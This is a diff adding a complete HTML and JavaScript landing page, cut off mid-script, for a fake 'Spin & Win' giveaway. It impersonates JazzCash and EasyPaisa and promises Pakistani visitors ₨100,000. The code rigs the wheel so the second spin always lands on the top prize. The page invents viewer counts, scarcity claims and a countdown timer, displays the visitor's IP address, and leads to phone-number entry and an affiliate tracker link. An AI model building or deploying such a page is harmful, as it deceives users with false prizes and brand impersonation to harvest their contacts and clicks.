@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Spin & Win | Exclusive Reward</title>
+  <style>
+    :root {
+      --bg: #000000;
+      --card-bg: #0a0a0a;
+      --border: #222;
+      --primary: #25D366;
+      --accent: #FFD700;
+      --text: #ffffff;
+      --text-muted: #888888;
+      --glow-green: rgba(37, 211, 102, 0.4);
+      --glow-yellow: rgba(255, 215, 0, 0.3);
+      --font-main: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    #particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 1;
+      overflow: hidden;
+    }
+    .particle {
+      position: absolute;
+      border-radius: 50%;
+      opacity: 0.4;
+      animation: float linear infinite;
+    }
+    @keyframes float {
+      0% { transform: translateY(100vh) scale(0.8); opacity: 0; }
+      15% { opacity: 0.6; }
+      85% { opacity: 0.6; }
+      100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+    }
+
+    .container {
+      width: 100%;
+      max-width: 480px;
+      padding: 16px 20px 80px;
+      z-index: 10;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    header {
+      width: 100%;
+      padding: 12px 24px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 13px;
+      letter-spacing: 2px;
+      color: var(--text-muted);
+      text-transform: lowercase;
+      font-weight: 700;
+    }
+    .logo-jazzcash {
+      color: #e80000;
+      text-shadow: 0 0 10px rgba(232,0,0,0.5);
+      letter-spacing: 2px;
+      border-bottom: 2px solid var(--accent);
+      padding-bottom: 4px;
+      text-transform: lowercase;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-weight: 800;
+    }
+    .logo-jazzcash img { height: 28px; object-fit: contain; }
+
+    h1 {
+      font-size: clamp(28px, 7vw, 40px);
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      background: linear-gradient(to right, #fff 40%, var(--accent));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 20px var(--glow-yellow);
+      margin-top: 10px;
+      margin-bottom: 6px;
+    }
+    h2 {
+      font-size: clamp(20px, 5vw, 26px);
+      font-weight: 700;
+      color: #FFD700;
+      margin-bottom: 10px;
+      text-shadow: 0 0 15px rgba(255,215,0,0.5);
+    }
+    .sub {
+      font-size: 15px;
+      color: var(--text-muted);
+      max-width: 85%;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+
+    .engagement {
+      display: flex;
+      gap: 20px;
+      justify-content: center;
+      margin-bottom: 16px;
+      font-size: 13px;
+      font-weight: 500;
+      color: #ccc;
+      background: rgba(255,255,255,0.04);
+      padding: 8px 14px;
+      border-radius: 30px;
+      border: 1px solid #1a1a1a;
+    }
+    .engagement span { display: flex; align-items: center; gap: 4px; white-space: nowrap; }
+    .live-dot { width: 6px; height: 6px; background: #25D366; border-radius: 50%; display: inline-block; animation: blink 1.5s infinite; margin-right: 2px; }
+    @keyframes blink { 50% { opacity: 0.3; } }
+
+    .wheel-wrapper-outer {
+      width: 100%;
+      max-width: 360px;
+      margin-bottom: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .wheel-container {
+      position: relative;
+      width: 300px;
+      height: 300px;
+      margin: 0 auto 5px;
+      z-index: 1;
+    }
+
+    canvas {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+    }
+
+    .pointer {
+      width: 0;
+      height: 0;
+      border-left: 16px solid transparent;
+      border-right: 16px solid transparent;
+      border-top: 28px solid #FFD700;
+      position: absolute;
+      top: -14px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 10;
+      filter: drop-shadow(0 0 8px rgba(255,215,0,0.6));
+    }
+
+    .wheel-center-gift {
+      position: absolute;
+      width: 70px;
+      height: 70px;
+      background: linear-gradient(135deg, #1a1a1a, #0a0a0a);
+      border: 3px solid #FFD700;
+      border-radius: 50%;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      box-shadow: 0 0 20px rgba(255,215,0,0.3), 0 4px 15px rgba(0,0,0,0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 30px;
+      cursor: pointer;
+      z-index: 5;
+      transition: all 0.3s ease;
+    }
+
+    .wheel-center-gift:hover {
+      box-shadow: 0 0 35px rgba(255,215,0,0.6), 0 4px 20px rgba(0,0,0,0.8);
+      transform: translate(-50%, -50%) scale(1.08);
+    }
+
+    .wheel-center-gift:active { transform: translate(-50%, -50%) scale(0.95); }
+    .wheel-center-gift.disabled { pointer-events: none; opacity: 0.5; cursor: not-allowed; }
+
+    .spin-btn-wrapper { position: relative; z-index: 2; margin-top: 8px; width: 100%; display: flex; justify-content: center; }
+
+    .spin-btn {
+      position: relative;
+      padding: 16px 50px;
+      font-size: 18px;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      color: #000;
+      background: linear-gradient(135deg, #FFD700 0%, #FFA500 50%, #FF8C00 100%);
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 0 20px rgba(255,215,0,0.5), 0 0 40px rgba(255,165,0,0.3), 0 8px 25px rgba(0,0,0,0.5), inset 0 2px 0 rgba(255,255,255,0.3);
+      transition: all 0.3s ease;
+      overflow: hidden;
+      animation: glowPulse 2s infinite;
+    }
+
+    .spin-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+      transition: left 0.5s ease;
+    }
+
+    .spin-btn:hover::before { left: 100%; }
+    .spin-btn:hover {
+      transform: translateY(-3px) scale(1.03);
+      box-shadow: 0 0 30px rgba(255,215,0,0.7), 0 0 60px rgba(255,165,0,0.5), 0 12px 35px rgba(0,0,0,0.6), inset 0 2px 0 rgba(255,255,255,0.4);
+    }
+
+    .spin-btn:active {
+      transform: translateY(0) scale(0.97);
+      box-shadow: 0 0 15px rgba(255,215,0,0.4), 0 4px 15px rgba(0,0,0,0.5), inset 0 2px 0 rgba(255,255,255,0.2);
+      transition: all 0.1s ease;
+    }
+
+    .spin-btn .btn-text { position: relative; z-index: 1; display: flex; align-items: center; gap: 10px; }
+    .spin-btn .btn-icon { font-size: 22px; animation: wiggle 0.8s infinite; display: inline-block; }
+    .spin-btn .sparkles { position: absolute; top: 50%; left: 50%; width: 0; height: 0; pointer-events: none; }
+    .sparkle { position: absolute; width: 6px; height: 6px; background: #fff; border-radius: 50%; animation: sparkleBurst 1.5s infinite; }
+    .sparkle:nth-child(1) { animation-delay: 0s; --x: -40px; --y: -30px; }
+    .sparkle:nth-child(2) { animation-delay: 0.3s; --x: 40px; --y: -25px; }
+    .sparkle:nth-child(3) { animation-delay: 0.6s; --x: -35px; --y: 30px; }
+    .sparkle:nth-child(4) { animation-delay: 0.9s; --x: 35px; --y: 35px; }
+    .sparkle:nth-child(5) { animation-delay: 1.2s; --x: 0px; --y: -40px; }
+    .sparkle:nth-child(6) { animation-delay: 0.15s; --x: -45px; --y: 5px; }
+    .sparkle:nth-child(7) { animation-delay: 0.45s; --x: 45px; --y: -10px; }
+    .sparkle:nth-child(8) { animation-delay: 0.75s; --x: 0px; --y: 40px; }
+
+    .spin-btn.disabled, .wheel-center-gift.disabled { pointer-events: none; opacity: 0.5; cursor: not-allowed; }
+    .spin-btn.disabled { animation: none; filter: grayscale(40%); }
+    .spin-btn.disabled .btn-icon { animation: none; }
+    .spin-btn.disabled .sparkle { animation: none; display: none; }
+
+    @keyframes glowPulse {
+      0%,100%{box-shadow:0 0 20px rgba(255,215,0,0.5),0 0 40px rgba(255,165,0,0.3),0 8px 25px rgba(0,0,0,0.5),inset 0 2px 0 rgba(255,255,255,0.3)}
+      50%{box-shadow:0 0 35px rgba(255,215,0,0.8),0 0 70px rgba(255,165,0,0.5),0 8px 30px rgba(0,0,0,0.6),inset 0 2px 0 rgba(255,255,255,0.4)}
+    }
+    @keyframes wiggle { 0%,100%{transform:rotate(0)} 25%{transform:rotate(-15deg)} 75%{transform:rotate(15deg)} }
+    @keyframes sparkleBurst { 0%{transform:translate(0,0) scale(1);opacity:1} 100%{transform:translate(var(--x),var(--y)) scale(0);opacity:0} }
+
+    .result-message {
+      margin-top: 15px; padding: 15px; border-radius: 12px; font-weight: 700; font-size: 16px;
+      display: none; animation: fadeInUp 0.4s ease-out; z-index: 1; position: relative; width: 100%;
+    }
+    .result-message.win { background: linear-gradient(135deg,rgba(255,215,0,0.15),rgba(255,165,0,0.1)); border:2px solid #FFD700; color:#FFD700; }
+    .result-message.lose { background: rgba(255,255,255,0.05); border:2px solid #555; color:#ccc; }
+    .result-message.chance { background: rgba(44,79,143,0.15); border:2px solid #2c4f8f; color:#6ba3ff; }
+
+    .notification-overlay {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(10px);
+      z-index: 300; display: flex; align-items: center; justify-content: center;
+      opacity: 0; pointer-events: none; transition: opacity 0.4s ease;
+    }
+    .notification-overlay.show { opacity: 1; pointer-events: all; }
+    .notification-popup-center {
+      background: linear-gradient(135deg,#1a1a2e,#16213e); border:2px solid #FFD700; border-radius:20px;
+      padding:24px 28px; text-align:center; box-shadow:0 20px 60px rgba(255,215,0,0.4);
+      max-width:320px; width:90%; animation:popIn 0.4s cubic-bezier(0.175,0.885,0.32,1.275);
+      position:relative; z-index:301;
+    }
+    .notification-popup-center .notif-icon { font-size:50px; display:block; margin-bottom:10px; animation:bounce-icon 0.6s infinite alternate; }
+    @keyframes bounce-icon { from{transform:translateY(0)} to{transform:translateY(-12px)} }
+    @keyframes popIn { from{transform:scale(0.8);opacity:0} to{transform:scale(1);opacity:1} }
+    .notification-popup-center .notif-title { font-size:20px; font-weight:800; color:#FFD700; margin-bottom:6px; }
+    .notification-popup-center .notif-text { font-size:14px; color:#ccc; margin-bottom:16px; line-height:1.5; }
+    .notification-popup-center .notif-close-btn {
+      background: linear-gradient(135deg,#FFD700,#FFA500); color:#000; border:none; padding:12px 32px;
+      border-radius:30px; font-weight:700; font-size:15px; cursor:pointer; letter-spacing:1px;
+      transition:all 0.2s; text-transform:uppercase;
+    }
+    .notification-popup-center .notif-close-btn:hover { transform:scale(1.05); box-shadow:0 8px 25px rgba(255,215,0,0.5); }
+
+    @keyframes fadeInUp { from{opacity:0;transform:translateY(15px)} to{opacity:1;transform:translateY(0)} }
+
+    .sponsor {
+      margin-top:16px; font-size:13px; color:var(--text-muted); display:flex; align-items:center;
+      justify-content:center; gap:8px; opacity:0.95; flex-wrap:wrap; background:rgba(255,255,255,0.03);
+      padding:10px 16px; border-radius:40px; border:1px solid #1a1a1a;
+    }
+    .sponsor-logo { height:26px; object-fit:contain; filter:brightness(1.1) drop-shadow(0 2px 4px rgba(0,0,0,0.5)); transition:transform 0.2s; }
+    .sponsor-logo:hover { transform:scale(1.05); }
+    .sponsor-separator { width:1px; height:20px; background:#333; margin:0 2px; }
+    .brand-tag { background:rgba(255,255,255,0.08); padding:4px 12px; border-radius:20px; font-weight:700; font-size:11px; color:#ddd; letter-spacing:0.5px; display:flex; align-items:center; gap:5px; }
+    .brand-tag.hd { background:linear-gradient(135deg,#FFD700,#FFA500); color:#000; font-weight:800; }
+
+    #comments-section { width:100%; max-width:400px; margin-top:24px; display:flex; flex-direction:column; gap:10px; }
+    .section-label { font-size:12px; color:#666; text-transform:uppercase; letter-spacing:1.5px; margin-bottom:8px; display:flex; align-items:center; gap:6px; }
+    .comment-card {
+      background:var(--card-bg); border:1px solid #1a1a1a; padding:10px 12px; border-radius:12px;
+      font-size:13px; display:flex; align-items:center; gap:10px;
+      animation:slideIn 0.3s ease-out forwards; opacity:0; transform:translateY(-5px);
+    }
+    .comment-avatar { width:30px; height:30px; border-radius:50%; background:linear-gradient(135deg,#333,#111); display:flex; align-items:center; justify-content:center; font-size:13px; color:#fff; font-weight:600; border:1px solid #333; flex-shrink:0; }
+    .comment-content { display:flex; flex-direction:column; text-align:left; flex:1; min-width:0; }
+    .comment-name { color:#aaa; font-weight:500; font-size:12px; }
+    .comment-text { color:#eee; line-height:1.4; margin-top:2px; word-break:break-word; }
+    .comment-location { color:#666; font-size:10px; margin-top:2px; display:flex; align-items:center; gap:3px; }
+    @keyframes slideIn { to{opacity:1;transform:translateY(0)} }
+
+    .user-info-fields { display:flex; gap:8px; margin-top:8px; }
+    .user-info-fields input { flex:1; background:#0f0f0f; border:1px solid #252525; border-radius:25px; padding:8px 14px; font-size:12px; color:#fff; outline:none; transition:border-color 0.3s ease; }
+    .user-info-fields input:focus { border-color:#FFD700; }
+    .user-info-fields input::placeholder { color:#555; }
+
+    .comment-input-wrap { display:flex; gap:8px; margin-top:8px; background:#0f0f0f; border:1px solid #252525; border-radius:50px; padding:6px; }
+    #userComment { flex:1; background:transparent; border:none; color:#fff; padding:8px 14px; font-size:13px; outline:none; }
+    #userComment::placeholder { color:#555; }
+    #postComment { background:var(--primary); color:#000; border:none; border-radius:30px; padding:8px 16px; font-weight:600; font-size:13px; cursor:pointer; white-space:nowrap; }
+    #postComment:disabled { opacity:0.5; cursor:default; }
+
+    .modal-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.88); backdrop-filter:blur(14px); display:none; align-items:center; justify-content:center; z-index:100; padding:20px; }
+    #initialModal { display:flex; }
+    .modal { background:var(--card-bg); border:1px solid var(--border); border-radius:20px; padding:26px 22px; width:100%; max-width:340px; text-align:center; box-shadow:0 20px 50px rgba(0,0,0,0.85); animation:popInModal 0.3s cubic-bezier(0.175,0.885,0.32,1.275); }
+    @keyframes popInModal { from{transform:scale(0.9);opacity:0} to{transform:scale(1);opacity:1} }
+    .modal h3 { font-size:18px; font-weight:800; margin-bottom:8px; color:#fff; line-height:1.4; }
+    .modal p { font-size:13px; color:#999; margin-bottom:14px; line-height:1.4; }
+    .modal-info { background:#0d0d0d; border-radius:12px; padding:14px; margin-bottom:16px; text-align:left; font-size:13px; color:#bbb; border:1px solid #2a2a2a; display:flex; flex-direction:column; gap:12px; }
+    .info-row { display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #1f1f1f; padding-bottom:8px; }
+    .info-row:last-child { border-bottom:none; padding-bottom:0; }
+    .info-label { color:#888; font-weight:500; }
+    .info-value { color:#fff; font-weight:600; display:flex; align-items:center; gap:5px; }
+    .country-flag-img { width:24px; height:auto; vertical-align:middle; margin-right:2px; }
+    .money-img { font-size:55px; margin:15px 0; }
+    .emergency-timer { background:#1a0000; border:2px solid #ff0000; border-radius:12px; padding:12px; margin:15px 0; color:#ff4444; font-weight:700; font-size:14px; }
+    .timer-display { font-size:32px; font-weight:800; color:#ff0000; letter-spacing:2px; animation:pulse-red 1s infinite; }
+    @keyframes pulse-red { 0%,100%{opacity:1} 50%{opacity:0.6} }
+    .timer-label { font-size:12px; color:#ff6666; margin-top:4px; }
+    .limited-offer { background:linear-gradient(135deg,#FFD700,#FFA500); color:#000; padding:6px 14px; border-radius:20px; font-weight:800; font-size:12px; display:inline-block; margin:8px 0; letter-spacing:1px; }
+    .scarcity-note { background:rgba(255,215,0,0.1); border:1px solid rgba(255,215,0,0.3); border-radius:10px; padding:10px; margin:10px 0; color:#FFD700; font-weight:700; font-size:13px; animation:glow-pulse 2s infinite; }
+    @keyframes glow-pulse { 0%,100%{box-shadow:0 0 5px rgba(255,215,0,0.2)} 50%{box-shadow:0 0 15px rgba(255,215,0,0.5)} }
+    .btn-primary,.btn-proceed,.btn-ok { width:100%; padding:13px; border:none; border-radius:50px; font-size:14px; font-weight:600; cursor:pointer; margin-bottom:8px; transition:all 0.2s; }
+    .btn-primary { background:var(--primary); color:#000; box-shadow:0 4px 12px rgba(37,211,102,0.3); }
+    .btn-proceed { background:var(--primary); color:#000; box-shadow:0 4px 12px rgba(37,211,102,0.3); animation:bounce-btn 0.8s infinite; font-size:16px; font-weight:700; letter-spacing:1px; }
+    @keyframes bounce-btn { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-6px);box-shadow:0 8px 20px rgba(37,211,102,0.5)} }
+    .btn-ok { background:#fff; color:#000; margin-top:6px; }
+    .hidden { display:none!important; }
+    @media(max-width:360px) { 
+      .wheel-container { width:260px; height:260px; } 
+      .spin-btn { padding:14px 35px; font-size:15px; } 
+      .wheel-center-gift { width:60px; height:60px; font-size:26px; }
+      .user-info-fields { flex-direction:column; gap:6px; }
+    }
+    #confetti-canvas { position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:200; }
+  </style>
+</head>
+<body>
+<div id="particles"></div>
+<canvas id="confetti-canvas"></canvas>
+
+<audio id="spinSound" preload="auto">
+  <source src="https://res.cloudinary.com/dbhfjxl73/video/upload/q_auto/f_auto/v1780664009/mixkit-fast-bike-wheel-spin-1614_mtkarj.wav" type="audio/wav">
+</audio>
+
+<div class="notification-overlay" id="notificationOverlay">
+  <div class="notification-popup-center">
+    <span class="notif-icon">🔄</span>
+    <div class="notif-title">One More Chance!</div>
+    <div class="notif-text">Don't give up! You have one more chance to win big. Try again now!</div>
+    <button class="notif-close-btn" id="notifCloseBtn">OK, LET'S GO!</button>
+  </div>
+</div>
+
+<header>
+  <span class="logo-jazzcash">
+    <img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" onerror="this.style.display='none';">
+    JazzCash
+  </span>
+</header>
+
+<div class="container">
+  <h1>CONGRATULATIONS!</h1>
+  <h2>Spin & Win!</h2>
+  <p class="sub">Spin the wheel to win up to <span style="color:var(--accent); font-weight:600;">₨100,000</span> Today!</p>
+  <p class="sub">Thousands of Pakistanis are claiming their prize today — why miss out?</p>
+ 
+  <div class="engagement">
+    <span><div class="live-dot"></div> <span class="likes-text">❤️ 1,200+</span></span>
+    <span>👁️ <span class="views-text">300,000+</span> Viewers</span>
+  </div>
+
+  <div class="wheel-wrapper-outer">
+    <div class="wheel-container">
+      <div class="pointer"></div>
+      <canvas id="wheel" width="500" height="500"></canvas>
+      <div class="wheel-center-gift" id="giftButton" onclick="spin()">🎁</div>
+    </div>
+    <div class="spin-btn-wrapper">
+      <button class="spin-btn" id="spinButton" onclick="spin()">
+        <span class="sparkles"><span class="sparkle"></span><span class="sparkle"></span><span class="sparkle"></span><span class="sparkle"></span><span class="sparkle"></span><span class="sparkle"></span><span class="sparkle"></span><span class="sparkle"></span></span>
+        <span class="btn-text"><span class="btn-icon">🎰</span> SPIN NOW <span class="btn-icon">🎰</span></span>
+      </button>
+    </div>
+    <div class="result-message" id="resultMessage"></div>
+  </div>
+
+  <div class="sponsor">
+    <span style="color:#aaa;font-size:11px;">Sponsored by</span>
+    <span style="font-weight:700;color:#e80000;font-size:12px;">JazzCash</span>
+    <img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" style="width:18px;height:18px;vertical-align:middle;object-fit:contain;margin-right:2px" onerror="this.style.display='none';">
+    <span style="font-weight:700;color:#1a73e8;font-size:12px;">EasyPaisa</span>
+    <img src="https://icon2.cleanpng.com/lnd/20250110/er/acded9d6362d497965c18a071cb9fd.webp" alt="EasyPaisa" class="sponsor-logo" onerror="this.style.display='none';">
+    <span class="sponsor-separator"></span>
+    <span class="brand-tag hd">✨ HD AD FREE</span>
+  </div>
+
+  <div id="comments-section">
+    <div class="section-label"><span class="live-dot"></span> Recent Visitor Comments</div>
+    <div id="comments-list"></div>
+    <div class="user-info-fields">
+      <input type="text" id="userName" placeholder="Your Name" maxlength="30" autocomplete="off">
+      <input type="text" id="userLocation" placeholder="Your Location (e.g. Lahore)" maxlength="40" autocomplete="off">
+    </div>
+    <div class="comment-input-wrap">
+      <input type="text" id="userComment" placeholder="Leave your comment here..." maxlength="80" autocomplete="off">
+      <button id="postComment">POST</button>
+    </div>
+  </div>
+</div>
+
+<!-- INITIAL POPUP -->
+<div id="initialModal" class="modal-overlay">
+  <div class="modal">
+    <h3>📱 Your phone number has been chosen to win upto! <span style="color:#FFD700;">₨100,000</span></h3>
+    <div class="limited-offer">⚡ LIMITED TIME OFFER</div>
+    <div class="modal-info" id="initialInfo">
+      <div class="info-row"><span class="info-label">IP Address</span><span class="info-value" id="userIP">Loading...</span></div>
+      <div class="info-row"><span class="info-label">Device</span><span class="info-value" id="initialDevice">Detecting...</span></div>
+      <div class="info-row"><span class="info-label">Country</span><span class="info-value"><img id="countryFlagImg" class="country-flag-img" src="" alt="" style="display:none;"> <span id="userCountry">Loading...</span></span></div>
+    </div>
+    <div class="scarcity-note" id="scarcityNote1">🔥 You are 1 among only 4 selected today!</div>
+    <div class="modal-sponsor">
+      <span>Sponsored by</span><span style="font-weight:700;color:#e80000;">JazzCash</span>
+      <img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" style="width:18px;height:18px;vertical-align:middle;object-fit:contain;margin-right:2px" onerror="this.style.display='none';"> JazzCash Exclusive
+    </div>
+    <button class="btn-primary" id="continueBtn" style="margin-top:12px;">CONTINUE</button>
+  </div>
+</div>
+
+<!-- WIN POPUP -->
+<div id="winCongratsModal" class="modal-overlay">
+  <div class="modal">
+    <h3>🎉 Congratulations!</h3>
+    <div class="money-img">💰💵💸</div>
+    <p style="font-size:15px;color:#fff;font-weight:600;">JazzCash has given you <span style="color:#FFD700;">₨100,000</span> to <span style="color:#FFD700;" id="winPurpose">cover your needs</span>!</p>
+    <div class="scarcity-note" id="scarcityNote3">🔥 You are 1 among only 4 selected today!</div>
+    <button class="btn-proceed" id="winProceedBtn">Proceed to Claim</button>
+    <div class="modal-sponsor">
+      <span>Sponsored by</span><span style="font-weight:700;color:#e80000;">JazzCash</span>
+      <img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" style="width:18px;height:18px;vertical-align:middle;object-fit:contain;margin-right:2px" onerror="this.style.display='none';">
+    </div>
+  </div>
+</div>
+
+<!-- CONFIRM POPUP -->
+<div id="winConfirmModal" class="modal-overlay">
+  <div class="modal">
+    <h3>📱 Confirm Your Phone Number</h3>
+    <div class="money-img">🔐</div>
+    <p>Enter your phone number to claim your <span style="color:#FFD700;">₨100,000</span> reward now!</p>
+    <div class="scarcity-note" id="scarcityNote2">🔥 You are 1 among only 4 selected today!</div>
+    <div class="emergency-timer">
+      <div>⚠️ OFFER EXPIRES IN</div>
+      <div class="timer-display" id="countdownTimer">00:59</div>
+      <div class="timer-label">Tap PROCEED now before it's too late!</div>
+    </div>
+    <button class="btn-proceed" id="proceedBtn">Confirm Phone Number</button>
+    <div class="modal-sponsor">
+      <span>Sponsored by</span><span style="font-weight:700;color:#e80000;">JazzCash</span>
+      <img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" style="width:18px;height:18px;vertical-align:middle;object-fit:contain;margin-right:2px" onerror="this.style.display='none';">
+    </div>
+  </div>
+</div>
+
+<script>
+(function() {
+  const CPA_LINK = "https://vtdmp.bemobtrcks.com/click/1?ns=c%3D391e0127-2fb1-490e-b450-95efb6f353d3..l%3D2..a%3D0..b%3D0";
+  const spinAudio = document.getElementById('spinSound');
+  spinAudio.volume = 0.6;
+  
+  const prizes = ["Rs. 100,000","Try Again","Rs. 70,000","Rs. 50,000","No Reward","Rs. 10,000","Try Again","One More Chance"];
+  const emojis = ["💰","❌","💵","💸","😞","🪙","❌","🔄"];
+  let spinCount = 0, currentAngle = 0, isSpinning = false;
+  const FORCED_WINS = [1, 0];
+
+  function getTargetPrize() { spinCount++; return spinCount <= FORCED_WINS.length ? FORCED_WINS[spinCount-1] : FORCED_WINS[FORCED_WINS.length-1]; }
+
+  const canvas = document.getElementById('wheel'), ctx = canvas.getContext('2d');
+  const NUM = prizes.length, ARC = Math.PI*2/NUM;
+  const colors = ["#1a1a1a", "#FFD700", "#0f0f0f", "#FFC107", "#222", "#FFD700", "#111", "#FFB300"];
+
+  function draw() {
+    ctx.clearRect(0,0,500,500);
+    for(let i=0;i<NUM;i++){
+      const s=currentAngle+i*ARC, e=s+ARC;
+      ctx.beginPath(); ctx.fillStyle=colors[i]; ctx.moveTo(250,250); ctx.arc(250,250,250,s,e); ctx.fill();
+      ctx.strokeStyle="rgba(255,255,255,0.2)"; ctx.lineWidth=1.5; ctx.stroke();
+      ctx.save(); ctx.translate(250,250); ctx.rotate(s+ARC/2); ctx.textAlign="right";
+      const p=prizes[i], emoji=emojis[i];
+      ctx.shadowColor="rgba(0,0,0,0.9)"; ctx.shadowBlur=8;
+      if(p.includes("Rs")){
+        ctx.font="30px Arial"; ctx.shadowBlur=6; ctx.fillText(emoji,200,-28);
+        ctx.fillStyle="#FFFFFF"; ctx.font="bold 19px Arial"; ctx.shadowBlur=10; ctx.fillText(p,220,8);
+        ctx.strokeStyle="#1a5c1a"; ctx.lineWidth=3.5; ctx.strokeText(p,220,8);
+        ctx.fillStyle="#4CAF50"; ctx.shadowBlur=0; ctx.fillText(p,220,8);
+      } else if(p==="Try Again"){
+        ctx.font="30px Arial"; ctx.shadowBlur=6; ctx.fillText(emoji,185,-28);
+        ctx.fillStyle="#FFFFFF"; ctx.font="bold 18px Arial"; ctx.shadowBlur=10; ctx.fillText(p,220,8);
+        ctx.strokeStyle="#8b0000"; ctx.lineWidth=3.5; ctx.strokeText(p,220,8);
+        ctx.fillStyle="#FF3333"; ctx.shadowBlur=0; ctx.fillText(p,220,8);
+      } else if(p==="No Reward"){
+        ctx.font="30px Arial"; ctx.shadowBlur=6; ctx.fillText(emoji,195,-28);
+        ctx.fillStyle="#FFFFFF"; ctx.font="bold 16px Arial"; ctx.shadowBlur=10; ctx.fillText(p,220,8);
+        ctx.strokeStyle="#8b3000"; ctx.lineWidth=3.5; ctx.strokeText(p,220,8);
+        ctx.fillStyle="#FF6600"; ctx.shadowBlur=0; ctx.fillText(p,220,8);
+      } else {
+        ctx.font="30px Arial"; ctx.shadowBlur=6; ctx.fillText(emoji,195,-28);
+        ctx.fillStyle="#FFFFFF"; ctx.font="bold 14px Arial"; ctx.shadowBlur=10; ctx.fillText(p,220,8);
+        ctx.strokeStyle="#0d2240"; ctx.lineWidth=3.5; ctx.strokeText(p,220,8);
+        ctx.fillStyle="#4d94ff"; ctx.shadowBlur=0; ctx.fillText(p,220,8);
+      }
+      ctx.restore();
+    }
+    ctx.beginPath(); ctx.arc(250,250,44,0,Math.PI*2); ctx.fillStyle="#0a0a0a"; ctx.fill();
+    ctx.strokeStyle="#FFD700"; ctx.lineWidth=2.5; ctx.stroke();
+  }
+
+  function getLandedSegment() {
+    let a=currentAngle%(Math.PI*2); if(a<0)a+=Math.PI*2;
+    let p=(-Math.PI/2)-a; while(p<0)p+=Math.PI*2; while(p>=Math.PI*2)p-=Math.PI*2;
+    return Math.floor(p/ARC);
+  }
+
+  function disableButtons() { document.getElementById('spinButton').classList.add('disabled'); document.getElementById('giftButton').classList.add('disabled'); }
+  function enableButtons() { document.getElementById('spinButton').classList.remove('disabled'); document.getElementById('giftButton').classList.remove('disabled'); }
+  function disablePermanently() {
+    const sb=document.getElementById('spinButton'), gb=document.getElementById('giftButton');
+    sb.classList.add('disabled'); sb.style.pointerEvents='none'; sb.style.opacity='0.5';
+    gb.classList.add('disabled'); gb.style.pointerEvents='none'; gb.style.opacity='0.5';
+  }
+
+  function playSound() { spinAudio.currentTime=0; spinAudio.play().catch(()=>{}); }
+  function stopSound() { spinAudio.pause(); spinAudio.currentTime=0; }
+
+  window.spin = function() {
+    if(isSpinning) return;
+    isSpinning=true; disableButtons();
+    const msg=document.getElementById('resultMessage'); msg.style.display='none'; msg.className='result-message';
+    playSound();
+    const targetIdx=getTargetPrize(), targetPrize=prizes[targetIdx];
+    const segCenter=targetIdx*ARC+ARC/2;
+    let targetAngle=(-Math.PI/2)-segCenter; while(targetAngle<0)targetAngle+=Math.PI*2; while(targetAngle>=Math.PI*2)targetAngle-=Math.PI*2;
+    let cur=currentAngle%(Math.PI*2); if(cur<0)cur+=Math.PI*2;
+    let rot=targetAngle-cur; if(rot<0)rot+=Math.PI*2;
+    const spins=(8+Math.floor(Math.random()*4))*Math.PI*2, total=rot+spins;
+    const startAngle=currentAngle, duration=5000;
+    let startTime=null;
+    function anim(ts) {
+      if(!startTime)startTime=ts;
+      const elapsed=ts-startTime, progress=Math.min(elapsed/duration,1);
+      currentAngle=startAngle+(1-Math.pow(1-progress,3))*total;
+      draw();
+      if(progress<1) requestAnimationFrame(anim);
+      else {
+        stopSound(); currentAngle=startAngle+total; draw(); isSpinning=false;
+        handleResult(getLandedSegment(),prizes[getLandedSegment()]);
+      }
+    }
+    requestAnimationFrame(anim);
+  };
+
+  function handleResult(idx,prize) {
+    const msg=document.getElementById('resultMessage');
+    if(prize==="Try Again") {
+      msg.textContent='😔 Better luck next time! Try again!'; msg.className='result-message lose'; msg.style.display='block';
+      setTimeout(()=>{msg.style.display='none';showNotification();},1500);
+    } else if(prize==="No Reward") {
+      msg.textContent='😞 No reward this time!'; msg.className='result-message lose'; msg.style.display='block';
+      setTimeout(()=>{msg.style.display='none';enableButtons();},2000);
+    } else if(prize==="One More Chance") {
+      msg.textContent='🔄 One more chance! Spin again!'; msg.className='result-message chance'; msg.style.display='block';
